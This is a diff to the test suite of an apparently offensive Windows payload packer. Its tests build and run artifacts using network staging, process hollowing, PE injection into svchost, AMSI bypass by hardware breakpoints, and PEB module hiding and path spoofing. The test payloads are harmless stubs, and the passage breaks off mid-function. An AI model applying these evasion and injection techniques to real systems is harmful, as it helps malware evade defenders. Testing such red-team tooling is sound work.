@@ -70,6 +70,7 @@ fn techniques_show_raw_prints_verbatim_readme() {
 /// produces a PE. Marked `#[ignore]` because it compiles the stub (needs
 /// `rustc` + the compiled dependencies).
 #[test]
+#[cfg(feature = "live-tests")]
 #[ignore = "requires rustc and the compiled dependencies"]
 fn build_with_amsi_patch_produces_pe() {
     let output = Command::new(env!("CARGO_BIN_EXE_picaro"))
@@ -90,6 +91,7 @@ fn build_with_amsi_patch_produces_pe() {
 /// clear error. Marked `#[ignore]` to keep the fast suite hermetic (this one
 /// needs no `rustc`, but it is grouped with the other e2e build checks).
 #[test]
+#[cfg(feature = "live-tests")]
 #[ignore = "requires rustc and the compiled dependencies"]
 fn build_with_invalid_order_fails() {
     let output = Command::new(env!("CARGO_BIN_EXE_picaro"))
@@ -143,6 +145,7 @@ fn quiet_flag_hides_the_banner() {
 /// End-to-end: a `bouncer` Preparation + `reflective_loading` pipeline compiles
 /// to a PE. Marked `#[ignore]` because it compiles the stub.
 #[test]
+#[cfg(feature = "live-tests")]
 #[ignore = "requires rustc and the compiled dependencies"]
 fn build_with_bouncer_produces_pe() {
     let output = Command::new(env!("CARGO_BIN_EXE_picaro"))
@@ -166,6 +169,7 @@ fn build_with_bouncer_produces_pe() {
 /// absence of that line tells whether the gate worked. Marked `#[ignore]`
 /// because it compiles two stubs and needs a Windows host.
 #[test]
+#[cfg(feature = "live-tests")]
 #[ignore = "requires rustc, the compiled dependencies and a Windows host"]
 fn bouncer_gate_blocks_and_allows_on_windows() {
     if !cfg!(windows) {
@@ -208,6 +212,7 @@ fn bouncer_gate_blocks_and_allows_on_windows() {
 /// End-to-end: `picaro build` with a custom loader stub produces a PE.
 /// Marked `#[ignore]` because it compiles the stub.
 #[test]
+#[cfg(feature = "live-tests")]
 #[ignore = "requires rustc and the compiled dependencies"]
 fn build_with_custom_stub_produces_pe() {
     let output = Command::new(env!("CARGO_BIN_EXE_picaro"))
@@ -271,12 +276,21 @@ fn build_interactive_quit_writes_nothing() {
 // --- payload runtime arguments ---
 
 /// Compiles `examples/payloads/test_args_payload.rs` and returns the exe path.
+#[cfg(feature = "live-tests")]
 fn build_args_payload() -> PathBuf {
+    // Two tests build this payload at the same time, and rustc derives its
+    // intermediate object names from the output stem: a shared name makes the
+    // parallel runs clobber each other's objects.
+    static SEQ: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
+    let seq = SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
     let src = Path::new(env!("CARGO_MANIFEST_DIR"))
         .join("examples")
         .join("payloads")
         .join("test_args_payload.rs");
-    let out = std::env::temp_dir().join(format!("picaro_args_payload_{}.exe", std::process::id()));
+    let out = std::env::temp_dir().join(format!(
+        "picaro_args_payload_{}_{seq}.exe",
+        std::process::id()
+    ));
     let status = Command::new("rustc")
         .arg(&src)
         .arg("-O")
@@ -292,6 +306,7 @@ fn build_args_payload() -> PathBuf {
 
 /// Packs `payload` with reflective loading, `args` and `mode`, and returns the
 /// packed exe path (relative to the crate root, where `cargo test` runs).
+#[cfg(feature = "live-tests")]
 fn pack_args_payload(name: &str, payload: &Path, args: &[&str], mode: &str) -> PathBuf {
     let yaml_args = args
         .iter()
@@ -338,6 +353,7 @@ runtime:
 }
 
 /// Extracts the payload's `argv` from its `ARGS_BEGIN`/`ARGS_END` stdout block.
+#[cfg(feature = "live-tests")]
 fn payload_argv(stdout: &[u8]) -> Vec<String> {
     let text = String::from_utf8_lossy(stdout);
     let mut argv = Vec::new();
@@ -355,6 +371,7 @@ fn payload_argv(stdout: &[u8]) -> Vec<String> {
 }
 
 /// Runs the packed binary with `args` and returns its parsed payload `argv`.
+#[cfg(feature = "live-tests")]
 fn run_packed(exe: &Path, args: &[&str]) -> Vec<String> {
     let output = Command::new(exe)
         .args(args)
@@ -372,6 +389,7 @@ fn run_packed(exe: &Path, args: &[&str]) -> Vec<String> {
 /// followed by the runtime args. `argv[0]` is the executable name.
 /// `#[ignore]`: needs `rustc` and the compiled dependencies.
 #[test]
+#[cfg(feature = "live-tests")]
 #[ignore = "requires rustc and the compiled dependencies"]
 fn payload_receives_yaml_then_runtime_args() {
     let payload = build_args_payload();
@@ -389,6 +407,7 @@ fn payload_receives_yaml_then_runtime_args() {
 /// End-to-end: with `args_mode: override`, the runtime args replace the YAML
 /// ones when present, and the YAML args are used when there are none.
 #[test]
+#[cfg(feature = "live-tests")]
 #[ignore = "requires rustc and the compiled dependencies"]
 fn payload_override_mode_prefers_runtime_args() {
     let payload = build_args_payload();
@@ -651,6 +670,7 @@ fn build_dry_run_does_not_fetch_a_staged_payload() {
 /// End-to-end: a plan with icon + version info + manifest embeds a `.rsrc`
 /// section, which `audit --json` reports. Marked `#[ignore]` (compiles a stub).
 #[test]
+#[cfg(feature = "live-tests")]
 #[ignore = "requires rustc and the compiled dependencies"]
 fn build_with_resources_embeds_a_resource_section() {
     let build = picaro(&["build".as_ref(), "tests/plans/resources.yaml".as_ref()]);
@@ -760,6 +780,7 @@ fn build_dry_run_resolves_randomized_metadata() {
 // --- x86 (M1) ---
 
 /// The `i686` rustc triple for the host's ABI: the stub and the payload share it.
+#[cfg(feature = "live-tests")]
 fn x86_target() -> &'static str {
     if cfg!(target_env = "msvc") {
         "i686-pc-windows-msvc"
@@ -775,6 +796,7 @@ fn x86_target() -> &'static str {
 /// built for it (`cargo build --target i686-pc-windows-msvc`), plus a Windows
 /// host to run the artifact (under WOW64 on an x64 one).
 #[test]
+#[cfg(feature = "live-tests")]
 #[ignore = "requires rustc, the i686 target and a Windows host"]
 fn packs_and_runs_an_x86_reflective_payload() {
     if !cfg!(windows) {
@@ -858,6 +880,7 @@ runtime:
 
 /// Compiles `examples/payloads/test_hollow_payload.rs` for `target` (`None` for
 /// the host) and returns the payload path.
+#[cfg(feature = "live-tests")]
 fn build_hollow_payload(target: Option<&str>) -> PathBuf {
     let src = Path::new(env!("CARGO_MANIFEST_DIR"))
         .join("examples")
@@ -883,6 +906,7 @@ fn build_hollow_payload(target: Option<&str>) -> PathBuf {
 }
 
 /// Packs `payload` with `process_hollowing` for `arch` and returns the artifact.
+#[cfg(feature = "live-tests")]
 fn pack_hollowing_payload(name: &str, payload: &Path, arch: &str) -> PathBuf {
     let source = payload.display().to_string().replace('\\', "/");
     let plan = format!(
@@ -928,6 +952,7 @@ runtime:
 /// target: the marker file (written by the hollowed process, which has no
 /// console) carries the payload's own `thread_local` value, and the stub relays
 /// the payload's exit code.
+#[cfg(feature = "live-tests")]
 fn assert_hollowed_run(artifact: &Path, name: &str) {
     let marker = PathBuf::from(format!("dist/{name}.marker"));
     let _ = std::fs::remove_file(&marker);
@@ -959,6 +984,7 @@ fn assert_hollowed_run(artifact: &Path, name: &str) {
 /// payload writes its marker and `thread_local` value to a file and exits 42.
 /// `#[ignore]`: needs `rustc`, the compiled dependencies and a Windows host.
 #[test]
+#[cfg(feature = "live-tests")]
 #[ignore = "requires rustc, the compiled dependencies and a Windows host"]
 fn packs_and_runs_a_hollowed_payload() {
     if !cfg!(windows) {
@@ -974,6 +1000,7 @@ fn packs_and_runs_a_hollowed_payload() {
 /// `CONTEXT32` entry hand-off and the `fs:[0x2C]` TLS slot, and the payload
 /// writes its marker and `thread_local` value before exiting 42.
 #[test]
+#[cfg(feature = "live-tests")]
 #[ignore = "requires rustc, the i686 target and a Windows host"]
 fn packs_and_runs_an_x86_hollowed_payload() {
     if !cfg!(windows) {
@@ -993,6 +1020,7 @@ fn packs_and_runs_an_x86_hollowed_payload() {
 ///
 /// `#[ignore]`: needs `rustc`, the `i686` target and a Windows host.
 #[test]
+#[cfg(feature = "live-tests")]
 #[ignore = "requires rustc, the i686 target and a Windows host"]
 fn x86_preparations_run_before_the_payload() {
     if !cfg!(windows) {
@@ -1213,6 +1241,7 @@ fn build_rejects_a_pe_payload_with_powershell_hosting() {
 ///
 /// `#[ignore]`: compiles a stub, and needs a Windows host with .NET Framework.
 #[test]
+#[cfg(feature = "live-tests")]
 #[ignore = "requires rustc, the compiled dependencies and a Windows host"]
 fn packs_and_runs_a_managed_payload() {
     if !cfg!(windows) {
@@ -1269,6 +1298,7 @@ fn packs_and_runs_a_managed_payload() {
 ///
 /// `#[ignore]`: compiles a stub, and needs a Windows host with .NET Framework.
 #[test]
+#[cfg(feature = "live-tests")]
 #[ignore = "requires rustc, the compiled dependencies and a Windows host"]
 fn packs_and_runs_a_managed_payload_on_x64() {
     if !cfg!(windows) {
@@ -1309,6 +1339,7 @@ fn packs_and_runs_a_managed_payload_on_x64() {
 /// `#[ignore]`: compiles a stub and a managed launcher (needs `rustc`, `csc.exe`
 /// and a Windows host with Windows PowerShell 5.1).
 #[test]
+#[cfg(feature = "live-tests")]
 #[ignore = "requires rustc, csc.exe and a Windows host with Windows PowerShell"]
 fn packs_and_runs_a_powershell_payload() {
     if !cfg!(windows) {
@@ -1416,6 +1447,7 @@ runtime:
 /// `#[ignore]`: compiles a managed module (needs `rustc`, `csc.exe` and a Windows
 /// host with Windows PowerShell 5.1).
 #[test]
+#[cfg(feature = "live-tests")]
 #[ignore = "requires rustc, csc.exe and a Windows host with Windows PowerShell"]
 fn packs_and_imports_a_powershell_module() {
     if !cfg!(windows) {
@@ -1473,6 +1505,7 @@ runtime:
 ///
 /// `#[ignore]`: it needs `SharpHound.exe` (not committed) plus a Windows host.
 #[test]
+#[cfg(feature = "live-tests")]
 #[ignore = "requires SharpHound.exe in tests/fixtures/ and a Windows host"]
 fn packs_and_runs_sharphound() {
     if !cfg!(windows) || !Path::new("tests/fixtures/SharpHound.exe").exists() {
@@ -1523,6 +1556,7 @@ fn packs_and_runs_sharphound() {
 
 /// Drop the leading `<timestamp>|` of every line, so two runs of a logging tool
 /// can be compared.
+#[cfg(feature = "live-tests")]
 fn without_timestamps(stdout: &[u8]) -> String {
     String::from_utf8_lossy(stdout)
         .lines()
@@ -1541,6 +1575,7 @@ fn without_timestamps(stdout: &[u8]) -> String {
 /// in this one place. Windows-only: the `windows` crate is `#![cfg(windows)]`,
 /// so the lint job on Linux cannot compile this.
 #[cfg(windows)]
+#[cfg(feature = "live-tests")]
 fn load_dll_and_call(dll: &Path, export: &str) -> i32 {
     use windows::core::{PCSTR, PCWSTR};
     use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryW};
@@ -1584,6 +1619,7 @@ fn load_dll_and_call(dll: &Path, export: &str) -> i32 {
 /// loaded by the image loader of the process that loads it.
 #[cfg(windows)]
 #[test]
+#[cfg(feature = "live-tests")]
 #[ignore = "requires rustc, the compiled dependencies and a Windows host"]
 fn a_dll_artifact_runs_the_chain_when_a_host_loads_it() {
     let build = picaro(&["build".as_ref(), "tests/plans/dll.yaml".as_ref()]);
@@ -1608,7 +1644,12 @@ fn a_dll_artifact_runs_the_chain_when_a_host_loads_it() {
 /// payload: `mode: indirect` with reflective loading, once per resolver
 /// (`hells_gate`, `tartarus_gate`, `api_hash`). Windows-only, since the stub is
 /// a Windows PE and indirect syscalls are x64-only.
+///
+/// `#[ignore]`: compiles three stubs and runs them, so it belongs to the
+/// hand-run lab suite (`cargo test --features live-tests -- --ignored`).
 #[test]
+#[cfg(feature = "live-tests")]
+#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
 fn indirect_syscall_resolvers_run_the_payload() {
     if !cfg!(windows) {
         return;
@@ -1647,4 +1688,792 @@ fn indirect_syscall_resolvers_run_the_payload() {
             String::from_utf8_lossy(&run.stderr)
         );
     }
+}
+
+// --- network stager (live) ---
+
+/// `mov eax, code; ret`: a shellcode that returns `code` to the loader, so the
+/// artifact's exit code proves which copy of the payload ran.
+#[cfg(feature = "live-tests")]
+fn exits_with(code: u8) -> Vec<u8> {
+    vec![0xB8, code, 0x00, 0x00, 0x00, 0xC3]
+}
+
+/// Serves `body` on a loopback port (a few connections, then the thread is left
+/// to die with the test process) and returns the URL.
+#[cfg(feature = "live-tests")]
+fn serve_payload(body: Vec<u8>) -> String {
+    use std::io::{Read, Write};
+
+    let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("bind loopback");
+    let port = listener.local_addr().expect("local addr").port();
+    std::thread::spawn(move || {
+        for _ in 0..4 {
+            let Ok((mut stream, _)) = listener.accept() else {
+                break;
+            };
+            let mut request = [0u8; 1024];
+            let _ = stream.read(&mut request);
+            let header = format!(
+                "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
+                body.len()
+            );
+            let _ = stream.write_all(header.as_bytes());
+            let _ = stream.write_all(&body);
+            let _ = stream.flush();
+        }
+    });
+    format!("http://127.0.0.1:{port}/implant.bin")
+}
+
+/// A URL on a loopback port nothing listens on: the fetch fails at connect.
+#[cfg(feature = "live-tests")]
+fn closed_loopback_url() -> String {
+    let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("bind loopback");
+    let port = listener.local_addr().expect("local addr").port();
+    drop(listener);
+    format!("http://127.0.0.1:{port}/implant.bin")
+}
+
+/// A stager plan: `implant` is staged from `url` and run reflectively.
+#[cfg(feature = "live-tests")]
+fn stager_plan(name: &str, url: &str, downloader: &str, fallback: &str, source: &str) -> String {
+    format!(
+        r#"schema: 6
+name: {name}
+build:
+  crypto:
+    algo: xchacha20poly1305
+    key: random
+  payloads:
+    implant:
+      source: "{source}"
+      format: shellcode
+  output:
+    path: ./dist/{name}.exe
+    strip: true
+    trim_paths: all
+runtime:
+  - technique: network_stager
+    params:
+      payload: implant
+      url: "{url}"
+      downloader: {downloader}
+      fallback: {fallback}
+  - technique: reflective_loading
+    params: {{ payload: implant }}
+"#
+    )
+}
+
+/// Builds a stager plan and returns the artifact path.
+#[cfg(feature = "live-tests")]
+fn build_stager(name: &str, plan: &str) -> PathBuf {
+    let plan_path = write_temp_plan(&format!("picaro_stager_{name}.yaml"), plan);
+    let build = picaro(&["--quiet".as_ref(), "build".as_ref(), plan_path.as_os_str()]);
+    assert!(
+        build.status.success(),
+        "{name} build failed: {}",
+        String::from_utf8_lossy(&build.stderr)
+    );
+    PathBuf::from(format!("dist/{name}.exe"))
+}
+
+/// End-to-end: a strictly staged payload is fetched over the in-process WinHTTP
+/// transport and runs. The served shellcode returns `43` and the artifact
+/// embeds nothing, so the exit code proves the fetched bytes ran.
+#[test]
+#[cfg(feature = "live-tests")]
+#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
+fn stages_and_runs_a_payload_over_winhttp() {
+    if !cfg!(windows) {
+        return;
+    }
+    let url = serve_payload(exits_with(43));
+    let artifact = build_stager(
+        "stager_winhttp",
+        &stager_plan(
+            "stager_winhttp",
+            &url,
+            "winhttp",
+            "none",
+            "./examples/payloads/demo_shellcode.bin",
+        ),
+    );
+    let run = Command::new(&artifact)
+        .output()
+        .expect("run the staged artifact");
+    assert_eq!(
+        run.status.code(),
+        Some(43),
+        "the fetched payload did not run: stdout={} stderr={}",
+        String::from_utf8_lossy(&run.stdout),
+        String::from_utf8_lossy(&run.stderr)
+    );
+}
+
+/// End-to-end, the best-of-both shape with a reachable server: `fallback:
+/// embedded` prefers the fetched copy (the embedded shellcode returns `42`, the
+/// served one `43`).
+#[test]
+#[cfg(feature = "live-tests")]
+#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
+fn a_staged_payload_with_a_fallback_prefers_the_fetched_copy() {
+    if !cfg!(windows) {
+        return;
+    }
+    let url = serve_payload(exits_with(43));
+    let artifact = build_stager(
+        "stager_fallback_up",
+        &stager_plan(
+            "stager_fallback_up",
+            &url,
+            "winhttp",
+            "embedded",
+            "./examples/payloads/demo_shellcode.bin",
+        ),
+    );
+    let run = Command::new(&artifact)
+        .output()
+        .expect("run the staged artifact");
+    assert_eq!(
+        run.status.code(),
+        Some(43),
+        "the fetch was expected to win: stdout={} stderr={}",
+        String::from_utf8_lossy(&run.stdout),
+        String::from_utf8_lossy(&run.stderr)
+    );
+}
+
+/// End-to-end, the offline half of the same shape: with the fetch failing at
+/// connect, the artifact runs the embedded copy (exit `42`) instead of failing
+/// the chain.
+#[test]
+#[cfg(feature = "live-tests")]
+#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
+fn a_staged_payload_with_a_fallback_runs_the_embedded_copy_when_the_fetch_fails() {
+    if !cfg!(windows) {
+        return;
+    }
+    let url = closed_loopback_url();
+    let artifact = build_stager(
+        "stager_fallback_down",
+        &stager_plan(
+            "stager_fallback_down",
+            &url,
+            "winhttp",
+            "embedded",
+            "./examples/payloads/demo_shellcode.bin",
+        ),
+    );
+    let run = Command::new(&artifact)
+        .output()
+        .expect("run the staged artifact");
+    assert_eq!(
+        run.status.code(),
+        Some(42),
+        "the embedded fallback did not run: stdout={} stderr={}",
+        String::from_utf8_lossy(&run.stdout),
+        String::from_utf8_lossy(&run.stderr)
+    );
+}
+
+/// End-to-end regression for the child-process transport after the transport
+/// split: `downloader: curl` fetches the payload through the child and the
+/// artifact still runs it. Skipped where `curl` is not on the PATH.
+#[test]
+#[cfg(feature = "live-tests")]
+#[ignore = "requires rustc, the compiled dependencies, curl and a Windows host"]
+fn stages_and_runs_a_payload_over_a_child_downloader() {
+    if !cfg!(windows) || Command::new("curl").arg("--version").output().is_err() {
+        return;
+    }
+    let url = serve_payload(exits_with(43));
+    let artifact = build_stager(
+        "stager_curl",
+        &stager_plan(
+            "stager_curl",
+            &url,
+            "curl",
+            "none",
+            "./examples/payloads/demo_shellcode.bin",
+        ),
+    );
+    let run = Command::new(&artifact)
+        .output()
+        .expect("run the staged artifact");
+    assert_eq!(
+        run.status.code(),
+        Some(43),
+        "the child-downloaded payload did not run: stdout={} stderr={}",
+        String::from_utf8_lossy(&run.stdout),
+        String::from_utf8_lossy(&run.stderr)
+    );
+}
+
+/// End-to-end: the wire crypto (`crypto: xchacha20poly1305` on the step)
+/// decrypts the fetched blob in the stub. The served bytes are a fixed
+/// ciphertext of the `exits_with(43)` shellcode and the plan carries the
+/// matching key/nonce, so a clean exit `43` proves the decrypt path ran.
+#[test]
+#[cfg(feature = "live-tests")]
+#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
+fn stages_a_wire_encrypted_payload_over_winhttp() {
+    if !cfg!(windows) {
+        return;
+    }
+    const KEY: &str = "1b551ffd11cee55cf16e1a6ca8fe5395bdc15c5e0f5e2161a997a8de9dd3b2b6";
+    const NONCE: &str = "f3e1c6fedbac7bb38dfb65a131d7d17f3e5009a469e79002";
+    // XChaCha20-Poly1305 ciphertext (with its 16-byte tag) of `mov eax, 43;
+    // ret`, generated once for this test.
+    let ciphertext: Vec<u8> = vec![
+        0xae, 0x3e, 0x8d, 0x85, 0x85, 0xb4, 0xc3, 0xfe, 0x63, 0xdb, 0xbc, 0xc4, 0x5e, 0x8e, 0x92,
+        0x5e, 0xcf, 0x46, 0xdb, 0x66, 0xf3, 0x11,
+    ];
+    let url = serve_payload(ciphertext);
+    let plan = stager_plan(
+        "stager_winhttp_crypto",
+        &url,
+        "winhttp",
+        "none",
+        "./examples/payloads/demo_shellcode.bin",
+    )
+    .replace(
+        "      fallback: none\n",
+        &format!(
+            "      fallback: none\n      crypto: xchacha20poly1305\n      key: \"{KEY}\"\n      nonce: \"{NONCE}\"\n"
+        ),
+    );
+    let artifact = build_stager("stager_winhttp_crypto", &plan);
+    let run = Command::new(&artifact)
+        .output()
+        .expect("run the staged artifact");
+    assert_eq!(
+        run.status.code(),
+        Some(43),
+        "the wire-encrypted payload did not run: stdout={} stderr={}",
+        String::from_utf8_lossy(&run.stdout),
+        String::from_utf8_lossy(&run.stderr)
+    );
+}
+
+// --- in-process preparations: probe payload ---
+
+/// Compiles `examples/payloads/probe_payload.rs` once and returns its path.
+#[cfg(feature = "live-tests")]
+fn build_probe_payload() -> PathBuf {
+    static BUILT: std::sync::OnceLock<PathBuf> = std::sync::OnceLock::new();
+    BUILT
+        .get_or_init(|| {
+            let src = Path::new(env!("CARGO_MANIFEST_DIR"))
+                .join("examples")
+                .join("payloads")
+                .join("probe_payload.rs");
+            let out = std::env::temp_dir().join(format!("picaro_probe_{}.exe", std::process::id()));
+            let status = Command::new("rustc")
+                .arg(&src)
+                .args(["-O", "-C", "strip=symbols", "-o"])
+                .arg(&out)
+                .status()
+                .expect("run rustc to build the probe payload");
+            assert!(status.success(), "the probe payload must compile");
+            out
+        })
+        .clone()
+}
+
+/// Packs the probe payload with an optional Preparation step (YAML lines,
+/// leading indentation included; empty for the control build) and returns the
+/// artifact path.
+#[cfg(feature = "live-tests")]
+fn pack_probe(name: &str, preparation: &str, args: &[&str], payload: &Path) -> PathBuf {
+    let source = payload.display().to_string().replace('\\', "/");
+    let args_yaml: String = args
+        .iter()
+        .map(|arg| format!("      - \"{arg}\"\n"))
+        .collect();
+    let plan = format!(
+        r#"schema: 6
+name: {name}
+build:
+  payloads:
+    probe:
+      source: "{source}"
+      args:
+{args_yaml}  output:
+    path: ./dist/{name}.exe
+runtime:
+{preparation}  - technique: reflective_loading
+    params: {{ payload: probe }}
+"#
+    );
+    let plan_path = std::env::temp_dir().join(format!("picaro_probe_{name}.yaml"));
+    std::fs::write(&plan_path, plan).expect("write the temp plan");
+
+    let output = Command::new(env!("CARGO_BIN_EXE_picaro"))
+        .args(["build", plan_path.to_str().expect("utf-8 plan path")])
+        .output()
+        .expect("run picaro build");
+    assert!(
+        output.status.success(),
+        "{name}: build failed: {}",
+        String::from_utf8_lossy(&output.stderr)
+    );
+    PathBuf::from(format!("dist/{name}.exe"))
+}
+
+/// Runs a packed probe artifact and returns its stdout.
+#[cfg(feature = "live-tests")]
+fn run_probe(artifact: &Path) -> String {
+    let run = Command::new(artifact)
+        .output()
+        .expect("run the probe artifact");
+    let stdout = String::from_utf8_lossy(&run.stdout).to_string();
+    assert!(
+        run.status.success(),
+        "the probe failed: stdout={stdout} stderr={}",
+        String::from_utf8_lossy(&run.stderr)
+    );
+    stdout
+}
+
+/// `hide_module` unlinks the loader from the PEB loader lists: the userland
+/// module enumerator stops reporting the image while its header stays intact.
+#[test]
+#[cfg(feature = "live-tests")]
+#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
+fn hide_module_unlinks_the_loader_from_the_module_list() {
+    if !cfg!(windows) {
+        return;
+    }
+    let payload = build_probe_payload();
+    let control = run_probe(&pack_probe("probe_hide_control", "", &["self"], &payload));
+    assert!(
+        control.contains("PROBE loader_listed=yes"),
+        "control: {control}"
+    );
+
+    let hidden = run_probe(&pack_probe(
+        "probe_hide_module",
+        "  - technique: hide_module\n",
+        &["self"],
+        &payload,
+    ));
+    assert!(
+        hidden.contains("PROBE loader_listed=no"),
+        "hide_module: {hidden}"
+    );
+    assert!(
+        hidden.contains("PROBE header=intact"),
+        "the header must stay intact: {hidden}"
+    );
+}
+
+/// `image_path_spoofing` repoints the PEB `ImagePathName`, so the image path
+/// `GetModuleFileNameW(NULL)` reports is the decoy.
+#[test]
+#[cfg(feature = "live-tests")]
+#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
+fn image_path_spoofing_repoints_the_reported_image() {
+    if !cfg!(windows) {
+        return;
+    }
+    let payload = build_probe_payload();
+    let control = run_probe(&pack_probe("probe_path_control", "", &["self"], &payload));
+    assert!(
+        control.contains("PROBE image_path=") && control.contains("probe_path_control.exe"),
+        "control: {control}"
+    );
+
+    let spoofed = run_probe(&pack_probe(
+        "probe_path_spoof",
+        "  - technique: image_path_spoofing\n    params:\n      path: \"C:\\\\Windows\\\\System32\\\\svchost.exe\"\n",
+        &["self"],
+        &payload,
+    ));
+    assert!(
+        spoofed.contains("PROBE peb_image_path=C:\\Windows\\System32\\svchost.exe"),
+        "image_path_spoofing: {spoofed}"
+    );
+    // Measured on Windows 11 26200: `GetModuleFileNameW(NULL)` resolves the main
+    // module through the loader list, not through this PEB field, so it keeps
+    // reporting the real path. What the technique fools is the PEB readers.
+    assert!(
+        spoofed.contains("PROBE image_path=") && spoofed.contains("probe_path_spoof.exe"),
+        "GetModuleFileNameW(NULL) is expected to keep reporting the real path: {spoofed}"
+    );
+}
+
+/// `erase_pe_header` zeroes the loader image's in-memory PE header: the probe's
+/// signature check fails while the process keeps running.
+#[test]
+#[cfg(feature = "live-tests")]
+#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
+fn erase_pe_header_zeroes_the_loader_header() {
+    if !cfg!(windows) {
+        return;
+    }
+    let payload = build_probe_payload();
+    let control = run_probe(&pack_probe("probe_header_control", "", &["self"], &payload));
+    assert!(
+        control.contains("PROBE header=intact"),
+        "control: {control}"
+    );
+
+    let erased = run_probe(&pack_probe(
+        "probe_header_erased",
+        "  - technique: erase_pe_header\n",
+        &["self"],
+        &payload,
+    ));
+    assert!(
+        erased.contains("PROBE header=erased"),
+        "erase_pe_header: {erased}"
+    );
+}
+
+/// Compiles a minimal **unsigned** `cdylib` once and returns its path.
+#[cfg(feature = "live-tests")]
+fn build_unsigned_dll() -> PathBuf {
+    static BUILT: std::sync::OnceLock<PathBuf> = std::sync::OnceLock::new();
+    BUILT
+        .get_or_init(|| {
+            let src =
+                std::env::temp_dir().join(format!("picaro_probe_dll_{}.rs", std::process::id()));
+            std::fs::write(
+                &src,
+                "#[no_mangle]\npub extern \"system\" fn picaro_probe_dll() -> i32 { 7 }\n",
+            )
+            .expect("write the probe DLL source");
+            let dll = std::env::temp_dir()
+                .join(format!("picaro_probe_unsigned_{}.dll", std::process::id()));
+            let status = Command::new("rustc")
+                .arg(&src)
+                .args(["--crate-type", "cdylib", "-O", "-o"])
+                .arg(&dll)
+                .status()
+                .expect("run rustc to build the unsigned DLL");
+            assert!(status.success(), "the unsigned DLL must compile");
+            dll
+        })
+        .clone()
+}
+
+/// `process_mitigations` (BlockDLLs) refuses to map a DLL that is not signed by
+/// Microsoft: the probe's own unsigned cdylib loads without the step and fails
+/// with it.
+#[test]
+#[cfg(feature = "live-tests")]
+#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
+fn process_mitigations_block_unsigned_dlls() {
+    if !cfg!(windows) {
+        return;
+    }
+    let payload = build_probe_payload();
+    let dll = build_unsigned_dll();
+    let dll_arg = dll.display().to_string().replace('\\', "/");
+
+    let control = run_probe(&pack_probe(
+        "probe_dll_control",
+        "",
+        &["load", &dll_arg],
+        &payload,
+    ));
+    assert!(control.contains("PROBE dll_load=ok"), "control: {control}");
+
+    let blocked = run_probe(&pack_probe(
+        "probe_dll_blocked",
+        "  - technique: process_mitigations\n",
+        &["load", &dll_arg],
+        &payload,
+    ));
+    assert!(
+        blocked.contains("PROBE dll_load=fail"),
+        "process_mitigations: {blocked}"
+    );
+}
+
+/// `hardware_breakpoints` answers `AmsiScanBuffer` at its entry: a call with a
+/// null context returns `S_OK` with a clean out-parameter instead of the real
+/// `E_INVALIDARG`, which proves the real function body never ran.
+#[test]
+#[cfg(feature = "live-tests")]
+#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
+fn hardware_breakpoints_never_enter_the_real_amsi_scan() {
+    if !cfg!(windows) {
+        return;
+    }
+    let payload = build_probe_payload();
+    let control = run_probe(&pack_probe("probe_amsi_control", "", &["amsi"], &payload));
+    assert!(
+        control.contains("PROBE amsi_status=0x80070057"),
+        "control: {control}"
+    );
+
+    let armed = run_probe(&pack_probe(
+        "probe_amsi_hwbp",
+        "  - technique: hardware_breakpoints\n",
+        &["amsi"],
+        &payload,
+    ));
+    assert!(
+        armed.contains("PROBE amsi_status=0x00000000"),
+        "the trap did not answer the call: {armed}"
+    );
+    assert!(
+        armed.contains("result=0x00000000"),
+        "the clean result was not written to the caller's out-parameter: {armed}"
+    );
+}
+
+// --- execution techniques without an e2e yet ---
+
+/// Packs one payload with one Execution step (`step` is the runtime step's
+/// YAML) and returns the artifact path.
+#[cfg(feature = "live-tests")]
+fn pack_execution(name: &str, source: &str, format: &str, args: &[&str], step: &str) -> PathBuf {
+    let args_yaml: String = if args.is_empty() {
+        String::new()
+    } else {
+        let items: String = args
+            .iter()
+            .map(|arg| format!("        - \"{arg}\"\n"))
+            .collect();
+        format!("      args:\n{items}")
+    };
+    let plan = format!(
+        r#"schema: 6
+name: {name}
+build:
+  payloads:
+    payload:
+      source: "{source}"
+      format: {format}
+{args_yaml}  output:
+    path: ./dist/{name}.exe
+runtime:
+{step}"#
+    );
+    let plan_path = std::env::temp_dir().join(format!("picaro_exec_{name}.yaml"));
+    std::fs::write(&plan_path, plan).expect("write the temp plan");
+
+    let output = Command::new(env!("CARGO_BIN_EXE_picaro"))
+        .args(["build", plan_path.to_str().expect("utf-8 plan path")])
+        .output()
+        .expect("run picaro build");
+    assert!(
+        output.status.success(),
+        "{name}: build failed: {}",
+        String::from_utf8_lossy(&output.stderr)
+    );
+    PathBuf::from(format!("dist/{name}.exe"))
+}
+
+/// End-to-end: `pe_injection` maps the payload into a suspended `svchost.exe`
+/// and relays its exit code. The marker and the `thread_local` value prove the
+/// payload's TLS was provisioned on the target thread.
+#[test]
+#[cfg(feature = "live-tests")]
+#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
+fn packs_and_runs_a_pe_injected_payload() {
+    if !cfg!(windows) {
+        return;
+    }
+    let payload = build_hollow_payload(None);
+    let source = payload.display().to_string().replace('\\', "/");
+    let artifact = pack_execution(
+        "pe_injection_x64",
+        &source,
+        "pe",
+        &["dist/pe_injection_x64.marker"],
+        "  - technique: pe_injection\n    params:\n      payload: payload\n      target: \"C:\\\\Windows\\\\System32\\\\svchost.exe\"\n",
+    );
+    assert_hollowed_run(&artifact, "pe_injection_x64");
+}
+
+/// End-to-end: `dll_hollowing` runs raw shellcode from a signed module's
+/// `.text` and relays its return value; the demo blob returns `42`.
+#[test]
+#[cfg(feature = "live-tests")]
+#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
+fn packs_and_runs_a_dll_hollowed_payload() {
+    if !cfg!(windows) {
+        return;
+    }
+    let artifact = pack_execution(
